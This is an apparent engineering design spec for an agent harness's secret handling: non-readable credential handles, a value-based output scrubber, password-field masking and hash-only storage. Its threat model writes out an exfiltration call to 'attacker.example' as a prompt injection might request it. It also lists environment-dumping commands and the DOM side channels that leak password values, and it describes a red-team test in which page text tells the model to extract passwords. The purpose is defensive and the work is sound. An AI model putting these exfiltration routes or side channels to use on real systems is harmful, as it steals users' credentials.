# Idea: secrets an agent can use but never read

**Status: idea, not started.** Written down on 2026-09-15 to come back to. Nothing here is built, and the sketch
under [Shape](#shape-a-sketch-unvalidated) is a guess to be argued with, not a design.

## The idea

Let an agent act with my credentials (an API token, a session) without the credential ever entering its context,
its tool results, the run log or an export. The model gets a handle it can pass to the places that need it, and
there is no operation that turns the handle back into the secret.

The browser already has this shape: a WebCrypto `CryptoKey` created with `extractable: false` can sign and decrypt,
and no API will hand you its bytes.

It came out of the read-only `exec` dialect ([`docs/dev/readonly-exec.md`](../dev/readonly-exec.md)), where what a
script can express is already the permission. A secret handle is the same move for authority: what the dialect
cannot say, the model cannot do.

## Threat model first

Hiding the value is the easy half. These are the ways a secret leaks anyway, and a design is only as good as its
answer to each.

1. **Exfiltration by destination.** `send({ auth: handle, url: "https://attacker.example/" })`. If the model chooses
   where the credential goes, it is gone, and a prompt injection on the page is exactly what would ask for that. A
   secret has to be bound to where it may be sent, the way `FETCH_SHEET` is hard-locked to `docs.google.com`.
2. **Reflection.** The legitimate destination sends it back: an endpoint that echoes request headers (httpbin's
   `/headers`), an error saying `invalid token ghp_…`, a debug field. The response lands in the model's context. A
   scrubber can remove the exact value and its common encodings (base64, URL-encoding), but a partial or transformed
   echo gets past it: redaction lowers the rate, it does not close the hole.
3. **Authority, not value.** An agent that cannot read a GitHub token can still delete a repository with it. Hiding
   the value does not limit what the value can do. The grant has to be attenuated: which origin, which methods,
   which paths, perhaps read-only.
4. **The page world.** `window.ml`, the read-only dialect and an approved `exec` all run in the page's main world,
   which a hostile page owns: it can patch `fetch`, read any object reachable from a global, and watch outgoing
   requests. So the secret can never be in the page, not even inside a closure. It stays in the service worker, and
   the request that carries it is made there.
5. **Oracles and side channels.** A response that differs by some property of the secret (its length, a prefix
   match on a lookup endpoint) leaks bits over several calls. Unlikely for bearer tokens, worth a sentence per API.
6. **Forged handles.** If a handle is just a name (`"github"`), the model can write one. That is only safe if the
   authority lives in the run's GRANT rather than in the handle: a forged handle then reaches only what the run was
   already allowed to use.

## Shape (a sketch, unvalidated)

- **Secrets live only in the service worker**, stored when I add them, each with a scope written at the same time:
  exact origins, allowed methods, path prefixes, and where it goes in the request (`Authorization: Bearer …`, a
  header name, a cookie).
- **A run is granted secrets by name**, the way a run is given tools today. The grant is what carries authority; the
  handle the model sees (`ml.secret("github")`) is an empty, frozen, null-prototype object holding no data, so
  `JSON.stringify`, `Object.values`, spread and string coercion have nothing to find.
- **The only sink is a background fetch**: something like `ml.fetch(url, { auth: handle })`. The worker checks the
  URL against the secret's scope, injects the credential, makes the request, scrubs the response, and returns it.
- **Approval** does not fit the dialect's rule, because a request has effects. It needs a third category: an effect
  through a declared, scoped capability. Asked once per run and secret, perhaps, and then free inside the scope.
- **Logs and exports** show the handle as `[secret: github]` and never the value, on every surface, including the
  raw model-facing view AGENTS.md requires.

## How it meets the other specs (2026-10-15)

The idea was written before policies, the effect algebra, the process host and the Python dialect existed on paper. Each
of them has a place for it, and together they answer parts of the threat model above.

- **A secret's scope is a policy.** The origins, methods and path prefixes written when the secret is stored are a
  predicate over a call's resolved facts, attached to the secret and evaluated like any other
  ([`POLICIES.md`](POLICIES.md)); it is the fifth hand-rolled grant store in that spec's table. Attenuation (threat 3)
  is then the same mechanism as every other "decide this without asking": a person narrows a scope the way they narrow
  a policy, on the one page that lists them.
- **In the effect algebra a secret is a resource with one operation.** `use(secret(name))` exists; `read(secret(name))`
  does not, in any vocabulary ([`EFFECTS.md`](EFFECTS.md)). A policy can see that a call carries a secret
  (`c.effects.uses("github")`) and bind it to a destination, which is threat 1 as a set predicate. A file the host flags
  as secret-looking is `read(fs(path))` with `secret: true`, inside no bound at all, the sandbox's included, because
  the harm is disclosure and no enforcer bounds that.
- **Processes are a sink**, and the biggest one ([`SHELL.md`](SHELL.md), "Security invariants"). A script names the
  handle in `env` (`{ GITHUB_TOKEN: ml.secret("github") }`); the policy sees the NAME; the host injects the value at
  spawn, into the environment or a credential helper, only for a program whose manifest may receive that secret.
  Reflection (threat 2) is answered by scrubbing the registered values from a process's output before any script or
  model reads it (`scrubSecrets` in `src/secret-scrub.ts` is the existing form of this, for the backend's own secrets).
  AMENDED 2026-11-17 (the coordinator's call, under ruling 18's order): the scrub sits in the WORKER, not the host, so a
  registered value can pass between the stages of a pipe on the host, and the host's `sha256` and `size` are over the
  raw bytes ("The scrub as built", below). A program whose manifest says it `echoes` its environment is refused with a
  secret present ([`PROGRAM_MANIFEST.md`](PROGRAM_MANIFEST.md)); that refusal lands with the handles slice, since until
  then no secret can reach a process at all. In host mode the person's own credential files and helpers are on disk,
  which the secret path flag and the scrubbed environment are for.
- **A secret lives beside its sink.** The worker holds the ones `ml.fetch` injects; the host holds the ones processes
  need (the OS keychain is the natural store); a handle names a secret wherever it lives, and the grant is evaluated
  where decisions are made, in the worker. The value never travels to a place that only decides.
- **On the wire a handle is a tagged name**, `{ "$secret": "github" }`, and never a value in either direction
  ([`ML_WIRE.md`](ML_WIRE.md)). Threat 6 (forged handles) is answered as the sketch hoped: the authority is the run's
  grant, so a forged name reaches only what the run already had.
- **In the Python dialect a handle is a receiver kind with no attributes and no methods**, whose `repr` is
  `[secret: github]`, passable only to an `ml` member whose manifest lists `use(secret)`
  ([`PYTHON_DIALECT.md`](PYTHON_DIALECT.md)). The persistent namespace holds the handle, never a value, because the
  value never enters any Python process. The JS dialect gets the same kind, and a script that names `ml.secret` never
  runs in the page's main world (threat 4), by the rule that already routes `ml.current` and `ml.sh` to an isolated
  world (`execNames` in `src/sw/exec-routing.ts`).
- **The backend's own URL and key are the built-in secret**, already handled this way: never to a page or the model
  (`src/sw/sw-scrub.ts`), never to a process.

## Scrubbing is by VALUE, in the harness, and says when it fired (2026-10-21)

From an incident on the GPU box the same day (the mlbox session's report): an agent read a container's environment
through a filter it wrote itself, `grep -vi "pass\|key\|token"`, and a live password printed anyway, because it sat in
the VALUE of a variable whose name gives no hint, inside a URL's userinfo (`...=tasmota@http://user:password@host`).
The value was in a gitignored `.env` the whole time. What that fixes in this spec's wording:

- **A denylist of NAMES written by the agent per command is the wrong layer.** Secrets hide in values of harmless keys
  (URLs, DSNs, connection strings, command lines), and a one-off filter under time pressure misses them. The scrub
  belongs between a tool's raw output and anything that reads it (the model, a pipe, a log, an export), and it never
  depends on the agent remembering. `scrubSecrets` already sits there for the backend's own secrets; the rule is that
  it takes a REGISTRY (every value the person marked secret, from a listed `.env`, the keychain, a handle's value) and
  runs on every tool result, file read and process output, matching the value and its obvious encodings (URL-encoded,
  base64, JSON- and shell-escaped). By value there are no false negatives for a known secret.
- **Patterns are the second line, for what nobody registered**: URL userinfo (redact the password, keep the host),
  `Authorization: Bearer|Basic`, the common key shapes (`sk-`, `ghp_`, `AKIA`, a JWT, a PEM block), `password=` and
  `secret=` pairs, a high-entropy token beside a credential word. Lower precision, so a match is replaced with a
  placeholder, never a refused call.
- **Commands that dump an environment are known to the manifest**, which is what `echoes` already says
  ([`PROGRAM_MANIFEST.md`](PROGRAM_MANIFEST.md)): `env`, `printenv`, `set`, `docker inspect`, `docker exec … env`,
  `/proc/*/environ`, `ps e`, `systemctl show -p Environment`, `kubectl get secret`, `git config -l`, a read of a `.env`
  or a credentials file. Refused with a secret present, scrubbed otherwise; a manifest that misses one is a finding.
- **A registered value in a tool's INPUT is flagged too**: the command line is logged as well, so a secret belongs in a
  handle or a temporary env file, never in argv.
- **The output says it was touched**: `[REDACTED:PLUG_PASSWORD]` in place, and "1 secret redacted (PLUG_PASSWORD)"
  appended, name and count only, never the value, so the model does not conclude the value is absent. The check "does
  this output contain secret X" is offered as a count, which is the practice that was already in use by hand.
- **The same scrub runs on persisted transcripts and exports**, so an unregistered secret that slipped through is fixed
  after the fact: register the value, re-scrub what is stored, report which sessions held it, and the person decides
  on rotation.

The test that discriminates: `FOO_SOURCES=a=x@http://u:REALSECRET@10.0.0.1` with `REALSECRET` in a registered `.env`
comes out redacted by value; the same line with it unregistered comes out redacted by the userinfo pattern. Not
built; this is the shape the scrub grows into, recorded so the next builder does not start from a name list. Being
built, 2026-11-17: "The scrub as built", below.

## The scrub as built (2026-11-17)

The order is Shane's (ruling 18: H10, containment, this scrub, H11 to H16, handles last). The worker seat, the
registry's source and the bounds below are the coordinator's calls, 2026-11-17, under that order. Two PRs: the registry
by exact value first, the key-shape patterns second, each pattern on by default only with a false-positive rate measured
on real captured output in its PR.

- **The seat is the worker.** Every text that crosses from the worker into a script or the model passes one scrub,
  [`forModel`](../../src/sw/sw-scrub.ts) extended with the registry:
  - a tool result, at the agent loop's hook ([`agent-loop.ts`](../../src/agent/agent-loop.ts), `deps.forModel`), in
    the worker-hosted loop;
  - a page-started model request, where it leaves the worker for the backend
    ([`background.ts`](../../src/background.ts), `FETCH_LLM` and the stream port, keyed on the sender, never on anything
    the page says): no registered value leaves the worker to a model backend in a page-started request. Every message
    role is scrubbed, the user's included (the page composed all of them), with a bare `[REDACTED]`, no name and no
    count line, so a registered name never reaches the model a page drives, and nothing is reported back to the page: no
    count, no flag, no difference in an answer. This covers the page-hosted loop
    ([`ml-agent-run.ts`](../../src/ml/ml-agent-run.ts)), whose scrub cannot run in the page (threat 4); a page-reachable
    scrub message would be an oracle and does not exist (the coordinator's call, 2026-11-17, under ruling 18's order);
  - the lines the loop appends after that hook (the `@tool:` line, the cut line, the budget line);
  - an `ml.sh` output's head and every `ml.sh.read` range, where they cross from the worker into the script
    ([`sh-call.ts`](../../src/shell/sh-call.ts) `headText`, [`sw-shell-call.ts`](../../src/sw/sw-shell-call.ts)), and
    the run's token store keeps the scrubbed head: a script never holds a registered value, so nothing it returns,
    logs or passes on can carry one. A `python_exec` cell reaches `ml.sh` only over the `ml` wire, whose `sh.run` and
    `sh.read` members call the same two functions ([`sw-ml-wire.ts`](../../src/sw/sw-ml-wire.ts)), so it meets the
    same two crossings and no other;
  - a tool's live output to the sidebar (`streamOutput`, emitted before the hook and kept in the JSON export): the
    text so far, scrubbed whole at each delta, its tail held back as a head's is;
  - a running call's peek tail, which reaches the model through `forModel` already (the task's tail and its stored
    value, [`sw-shell-call.ts`](../../src/sw/sw-shell-call.ts) `peekTail`, and the task messages);
  - a resumed run's history ([`forModelHistory`](../../src/sw/sw-scrub.ts)), so a value registered after a session
    was stored is scrubbed from what a resumed model is sent, though the stored session still holds it;
  - the run log's `key`, which keeps an error's raw text for extension pages: the registry's values are scrubbed from
    it, and the backend's own URL, key and filter stay there as today;
  - what the run keeps beside a tool result (`forStored`, the loop's `scrubStored`): the tool's Out render, which the
    sidebar and both exports draw, and so a pointer's fuller capture, which a later `@tool:` read hands a script or the
    model. Every string in it is scrubbed as the result is, without the count line; image data is not scanned;
  - an error answered to a page (`forPage`): every string under an error key, at any depth beneath it, the config's
    secrets and then each registered value as a bare `[REDACTED]`, so a page never learns a name. It waits for the
    registry and fails closed to "The request failed."
- **The host does not scrub.** A process's held output stays its raw bytes, so a registered value can pass between
  the stages of a pipe on the host (an OS pipe, which never crosses into the worker); it is scrubbed before any script
  or model reads it. `done`'s `sha256` and `size` are over the raw bytes. A scrubbed read says so: a text range comes
  back with its matches replaced, a binary range as scrubbed bytes with `scrubbed: <n>`, and either may be shorter or
  longer than `length`.
- **A cut never lets a prefix through.** A read range is fetched with a margin of the longest registered form on each
  side and scrubbed whole, and a match that overlaps the range is replaced where it overlaps. A head whose last bytes
  are the start of a registered form is cut before them, and its `complete` is false.
- **The registry**, by name and value, is `ml_secret_registry` in `chrome.storage.local` (never sync), declared in the
  state registry beside its store. It is class secret under [`MODEL_SETTINGS.md`](MODEL_SETTINGS.md) ("Not settings,
  never writable"): never in `GET_CONFIG`, `ml.settings()` or an answer to any page-reachable message, never written by
  `change_setting`, and not a key of `MlConfig`. The person adds an entry in the DevTools Settings panel, through a
  message only an extension page may send; the panel gets names and a count back, never a value. The backend's own
  URL, key and model filter stay the built-in entries (`secretsOf`). Bounds, each refused when an entry is added:
  at most 64 entries; a value of 8 to 512 characters (a shorter one would match ordinary text, and the margins and
  the base64 forms grow with a longer one); a NAME matching `[A-Z0-9_]{1,40}`, since it is written into model-facing
  text. `ml_secret_registry` is in no backup, export or archive-folder file (the backup inventory classes it `never`),
  the state inspector shows its names and a count, never a value, and the housekeeping log records a read of the store
  that failed (`secrets`/`registry-unreadable`), with no name and no value.
- **Before the registry is read, no crossing reads it as empty.** The worker starts the read when it starts. A crossing
  that can wait (a tool result, a page-started request, an `ml.sh.read` range) awaits it; one that cannot (a live
  output's delta, the loop's appended lines, the run log's `key`) shows nothing, or a held-back line, until it is done.
  A store that cannot be read fails each waiting crossing closed and is read again by the next one, and a change the
  store reports while the first read is in flight wins over that read.
- **The forms matched** for each value: as written, JSON-escaped, percent-encoded, base64 (standard and URL-safe, at
  each of the three byte alignments a value can take inside a longer base64 run) and shell-escaped (single-quoted with
  `'\''`, and backslash-escaped).
- **The output says it was touched.** Each match becomes `[REDACTED:<NAME>]`, and the tool result ends with one line,
  `1 secret redacted (PLUG_PASSWORD)`, names and a count, never a value. What the run stores and exports is what the
  model saw, so the sidebar (its live output included), the run log and both exports never hold a registered value
  that arrived after it was registered.
- **Known limits**: images; the person's own turn and the page context the run is started with; a value that was
  transformed or only partly echoed (threat 2); a value registered after a session stored it (re-scrubbing stored
  sessions is a later slice); anything a pattern does not know until PR 2; a script or model that already holds a guess
  can confirm it, by echoing the guess and seeing the marker; the model's own tool arguments, which are not scrubbed; an
  approved page that drives a model can confirm a full guess it already holds if the model repeats the marker, and
  learns no name; the page-world tool results of a page-hosted run stay the page's own and are not scrubbed for the
  page; a page whose own text comes back in an error (a refusal that quotes what it refused) can confirm that a guess
  equals a registered value, by seeing `[REDACTED]` where its text was, though never which one; a registered value at
  rest in the value store behind a pointer (a `fetch_url` page's whole text, a stored table) until PR 2 scrubs it where
  it is written: every model-bound read of it (a `@tool:` read, a pipe's head, range or grep, the output of a script
  that called `ml.dereference`) crosses the scrub, so what remains is the value at rest and an approved script that
  reads it and transforms it before printing; a registered value inside an answer's `data` to a page (anything not under
  an error key) is not scrubbed, since the data is the handler's answer and only the error text is the worker's own;
  `GET_CONFIG`'s answer to a page is not run through the registry, by design, since what keeps a secret out of it is
  `publicConfig`'s fixed key list (`redteam-lifetimes-config.test.mjs`, #1942, enumerates it, no secret key among them),
  and a public value equal to a registered one reaches the model only through a crossing that scrubs it (a page-started
  request, or a tool result that read the page).
- **Deferred to the handles slice**: reading values from a listed `.env` (a new host message), the keychain, a handle's
  value, and the `echoes` refusal.

## Open questions

- Is per-API scoping bearable to set up, or does it need presets (GitHub read-only, one Google Sheet)?
- Can scrubbing be made good enough for the APIs that matter, or do some APIs have to be marked as echoing and
  refused outright?
- Where does the model's authority stop: can a handle be passed to a server-side tool (OpenWebUI) at all, given
  that the server would then hold it?
- Does this belong in the harness only, or also on the server, for model-provider keys a client should never hold?

## Prior art

- **WebCrypto non-extractable keys**: use without read, enforced by the platform.
- **Object capabilities** (the E language, Mark Miller; SES / Hardened JavaScript): authority carried by unforgeable
  references, attenuated by wrapping them. Sealer/unsealer pairs are close to the handle here.
- **Macaroons**: bearer tokens that carry their own caveats (origin, expiry, path), attenuated by the holder.
- **CI secret masking** (GitHub Actions redacts registered secrets from logs): the redaction half, and a record of
  how often transformed values get past it.

## Amendments after the scrub (2026-11-18)

Three rulings of Shane's that build on the registry scrub ([#1948](https://github.com/parawanderer/window-ml/pull/1948),
"The scrub as built"). The coordinator's calls under each are marked as such and were surfaced to Shane. Nothing here
is built yet. Ruling 30's value scrub lands after scrub PR 2, its channel mask with handles; ruling 32 lands before
handles; ruling 33 lands once ruling 32's store and its Settings page exist.

### Page password fields are masked from the model (ruling 30)

**What is held.** A value in a password-class field (below) that the run's own `type` calls did not write. The
exemption is exact: a field is exempt only while its current value EQUALS what the run's own `type` calls wrote into
it. A value the person typed, one the browser or a password manager filled, and one the run typed part of and someone
else completed are all held. A click that reveals a value (a "show password" control, the model's click included)
exempts nothing. The worker knows what its own `type` calls wrote; that is the only exemption.

**Password-class**, each decided per field and sticky for the page's life once true:

- `type=password`, and a field that was `type=password` and was switched to another type (a show toggle);
- an `autocomplete` attribute with any of the tokens `current-password`, `new-password`, `one-time-code`,
  `cc-number` or `cc-csc`, matched as tokens (`section-x billing cc-number` counts);
- a computed `-webkit-text-security` of `disc`, `circle` or `square` on a non-password input, which banks use for PIN
  and card fields;
- in the page's own document, its same-origin frames and its open shadow roots.

Considered and left out: guessing by `name` or `id` (`pin`, `cvv`, `ssn`), which would mask far more ordinary text
than it protects.

**Two mechanisms, landing at different times.**

1. *The value scrub* (after scrub PR 2). Every value seen in a held field joins the session's registry, kept in
   `chrome.storage.session`: in memory, NEVER ON DISK, never written to `ml_secret_registry`, and surviving the worker's
   eviction (an MV3 worker is stopped after about 30 seconds idle). It has to survive it, because #1948 scrubs stored
   text when it is READ (`forStored`): a set lost with the worker would leave a page value already in the session's
   stored output unscrubbed in the sidebar, the exports and a `@tool:` read. The session's page values stay in
   `chrome.storage.session` always and are never written to the local store, where a stolen profile would give a weak
   page password to offline guessing; once ruling 32's matcher exists they MAY be held in `chrome.storage.session` in
   its hash-only form. The worker reads the fields of each tab the run has touched with a tool at the start and end of
   every tool call on that tab, and again when a result from that tab is about to cross to the model. It keeps every
   value it has seen for the session, not only the current one, so a value read by an approved script and then changed
   is still scrubbed. No keystroke listener. From there the scrub is the registry's: the same forms, the same crossings,
   `[REDACTED:<NAME>]` with a generated name (`PAGE_PASSWORD_1`). The row: a value seen, the worker restarted, and the
   session's stored output still scrubbed. The bound (proposal): at most 256 values a session. At the bound, nothing
   held is dropped: results from a tab with a held field stop crossing, each answered with a line saying the session
   holds more masked values than it can scrub, and the run log records it.
2. *The channel mask* (with handles; ruling 25 needs it too). Every read path the dialect and the DOM survey have
   answers `"filled"` for a held field's value, and the field is blanked in screenshots and in what a vision model is
   shown. The read paths, as a list the red team's rows are written from; a path not on it is a defect in the list:
   - the `value` and `defaultValue` properties, and `.value.length`;
   - `valueAsNumber` and `valueAsDate`;
   - for a password-class `textarea`, its `textContent`, `innerText` and `defaultValue`;
   - the validity surface, which tells length and pattern membership: `validity.tooShort`, `tooLong` and
     `patternMismatch`, the `:valid` and `:invalid` pseudo-classes, and `checkValidity()`;
   - the `value` attribute (`getAttribute`, `attributes`), which a server re-renders after a failed submit;
   - `outerHTML` and `innerHTML` of the field or of any ancestor, and any other serialisation of an ancestor
     (`XMLSerializer`);
   - `FormData` over the form, `form.elements`, and a `URLSearchParams` built from either;
   - the selection APIs over the field (`selectionStart`/`selectionEnd` with the value, `getSelection`);
   - an attribute selector on `value` (`input[value^="a"]`), which answers one character at a time;
   - the accessibility tree a CDP read returns, which carries a text field's value once it is not `type=password`;
   - the page's URL after a GET submit of a form holding the field (the value scrub covers this one, for values of 8
     characters or more);
   - a screenshot, and what `look` and `locate` show a vision model.

**A tab holding a held field** (coordinator's call). While it does, an unmediated main-world `exec` on that tab asks,
and the card names the field. The residual, stated plainly: an approved script can read the value and re-encode it
(reversed, base64, one character a line) before printing, and only the channel mask, not the scrub, stands in front
of that.

**Frames and shadow roots.** A same-origin frame and an open shadow root are inside the mask. A cross-origin frame (a
payment frame) is out of the dialect's reach, so it gets the screenshot mask only, when CDP can locate the field
through the frame tree. A closed shadow root is out of the dialect's reach too: it gets the screenshot mask only when
CDP's piercing DOM read can locate the field, and nothing otherwise.

**Known limits.** A value under 8 characters (a PIN, a one-time code, a card security code) gets the channel mask only,
since a short string occurs in ordinary text and scrubbing it would both corrupt output and answer as an oracle. A value
typed and cleared before any read is never registered. A page that mirrors the value into ordinary DOM (a strength
meter, a "show password" span, a hidden field) is not marked; the value scrub catches the mirror only for a value of 8
or more characters. Layout metrics (the field's `scrollWidth`, a caret's rectangle) give an approximate length. A
transformed route (reversed, encoded) is lost by the channel mask failing, not by the scrub, which knows only the forms
it matches.

**Acceptance: Test C** of the secrets game. Tests A and B are ruling 25's, recorded only in the plan
([docs/plan/repl/README.md](../plan/repl/README.md)): told to check out for the person, the model succeeds using the
secret; told to grab the card, it cannot read it. The game's own section is written with handles; Test C stands on its
own. A fake page with four held fields: one typed by the harness as
"the user"; one filled before the run as "the password manager"; one that starts `type=password` with a value the run
did not type and is switched to `type=text`, both by the page's own show control and by the model clicking that
control itself; and one plain text input with `-webkit-text-security: disc`. The model is told to get the values, in
the person's prompt and in the page's text. A loss is the model reproducing a whole value by any route, one character
at a time included; the value stays masked in every channel, the dialect, the DOM survey, screenshots and vision. The
red team's scripted differential rows are the CI guard. The real-model run is the bench's and needs Shane's yes in
the bench session.

### A secret the model never uses is stored hash-only (ruling 32)

**Two classes, chosen when a secret is registered.** `mask`, the default: recognised and redacted, never usable by the
model, stored without its value. `use`: kept as a value, for a handle to use without the model reading it. A `mask`
secret cannot become `use` without the value being entered again, and the Settings page shows a `mask` secret's name
only. The registry #1948 built keeps every entry as a value; under this ruling those become `mask` entries (below).

**What a `mask` entry stores**, per form of its value (the forms below): the form's length `L`, a short keyed filter
hash `F` of its first `k` characters, and a slow confirm hash `C` of the whole form; never the value. The key `K` and a
per-entry salt are random, generated once and kept beside the entries in local storage, never synced or backed up.

**Matching, one pass a crossing.** Slide a window of `k` characters over the text with a rolling keyed hash (a
polynomial hash with a random base drawn from `K`), truncate it to `w` bits, and look each position up in the table of
every stored `F`. The window slides over UTF-16 code units, the unit JavaScript's strings are in, and every `L` and `k`
counts the same unit. A streamed crossing (a live output, a read range) carries the last `max(L) - 1` units of one chunk
into the next, so a form cut by a chunk boundary is still seen whole. A form shorter than `k` units is never stored;
deriving one is refused, and a row asserts it. A position that hits is a candidate for each entry with that filter; for
each, compute `C` over the `L` characters starting there, and a match is a replacement. One pass serves every entry and
every form whatever their lengths, since all filters are over the first `k` characters; `k` is the 8-character floor.

**The forms** are derived when the value is registered, while it is in hand, and each gets its own `(L, F, C)`: as
written, JSON-escaped, percent-encoded, base64 standard and URL-safe at each of the three byte alignments a value can
take inside a longer base64 run, and shell-escaped (single-quoted with `'\''`, and backslash-escaped). That is the
plaintext scrub's list from #1948, so a `mask` entry matches no fewer forms than a value entry does.

**What it costs, and what a stolen store gives.** With `E` stored forms, a text of `N` characters and a `w`-bit filter,
a crossing pays one rolling pass over `N`, plus about `N·E / 2^w` false candidates, each a slow confirm at cost `c`. An
attacker with the store pays the same per guess: a cheap filter over a dictionary of `D` candidate values, then
`D / 2^w` slow confirms. The filter is what lets a crossing run at line rate, and it gives an attacker the same rate. A
stolen store also gives each secret's exact length, since `L` of the as-written form is it. So hash-only storage
protects a high-entropy secret (an API token, a generated password) completely, removes the value from disk and from
anything that reads storage, and does not protect a weak password from offline guessing by whoever holds the profile.
The spec states that, not more. The widths are provisional until measured: `k = 8`, `w = 24` and a slow hash
(PBKDF2-SHA256 through WebCrypto) at about a millisecond. At 64 entries of 11 forms each (`E` about 700) on a 1 MiB
result, that is about 44 slow confirms a crossing. The per-crossing time, the false candidates and the slow hash's cost
at 64 entries on a 1 MiB result are measured in a notebook (`notebooks/<topic>/`) before the widths are fixed (the
coordinator's call).

**A timing oracle.** The slow confirm runs only on a filter hit, so a crossing's time tells a text holding a stored
8-character prefix from one that does not: a prefix oracle beside the redaction oracle in "The scrub as built". The
notebook measures whether the difference is observable from a page through `forPage`; if it is, the confirm cost is
paid on a fixed schedule, or a page's crossing is answered no sooner than a floor.

**Short values.** The 8-character floor stays for `mask` entries. A string of `n` characters over an alphabet of size
`a` occurs about `N / a^n` times in `N` characters of text that looks random to it: a 4-digit PIN about 100 times in a
MiB of digits, an 8-character alphanumeric value effectively never. A short value is the channel mask's to hold, not
the scrub's.

**Upgrade.** On the first start of the version that has the two classes, every entry #1948 wrote as `{ name, value }`
becomes a `mask` entry: its forms' `(L, F, C)` are derived and the value is deleted, in one write. Until that write
succeeds the old entries stay and are matched as before, so a failed upgrade never stops the scrub, and it is retried
at the next start. No entry is `use` after the upgrade, since nothing used values before handles. The row: a fixture of
what #1948 wrote, read by the new code, still scrubs the value, and the store then holds no value.

### Setting up the store is an inbox item (ruling 33)

Once ruling 32's store and its Settings page exist, setting it up is an item in the chat page's attention inbox
(`AttentionPage`, `src/chat/attention-page.tsx`, items from `src/chat/attention.ts`), not a second inbox. Coordinator's
calls, each surfaced to Shane:

- **The item** is a new runtime code reported by `src/sw/sw-attention.ts`, `secrets-not-set-up`, at level `suggests`,
  with a fix action that opens the form, and the inbox's existing dismiss (`dismiss` and `dismissed` in
  `src/chat/view-mode.tsx`). The code carries no name and no value, only that the registry is empty.
- **When.** It appears once the store is available and the registry is empty. A dismissal is durable and per profile.
  Someone who already has entries never sees it, and Settings stays the permanent way in.
- **Whose gesture.** Filling is the person's alone. No model tool, page message, `change_setting` or `ml.settings`
  can create, fill or dismiss the item, and the model never sees the form's fields or values: ruling 30's channel mask
  applies to our own form as to any page's.
- **The form.** Each row is a name, a value and a type, the type `mask` by default. The text says in plain words what
  each type does: `mask` is recognised and redacted, never usable by the model, and stored as hashes only; `use` is
  kept as a value so the model can use it through a handle without reading it. It also says the limits: a value
  under 8 characters, and a value that is transformed before it is printed.
- **Where values are entered.** In the first build, only in the renderer the extension hosts. A remote host of the
  renderer (the web build, the phone) shows the item and the explanation, and its fix action explains that entry is
  on the computer, deferred as ruling 24 defers a remote unhide. The phone's native inbox receives state-level codes
  already (`src/native/snapshot.ts`), so the item shows there with no hub change. Entering a value remotely later
  would carry a value inside a sealed command to the runtime. The hub passes sealed payloads opaquely, so it would
  likely need no change, but a value crossing devices is a new kind of payload and gets its own ruling then.
- **Who builds it.** The chat page lane, after this spec merges and the store's Settings page exists.
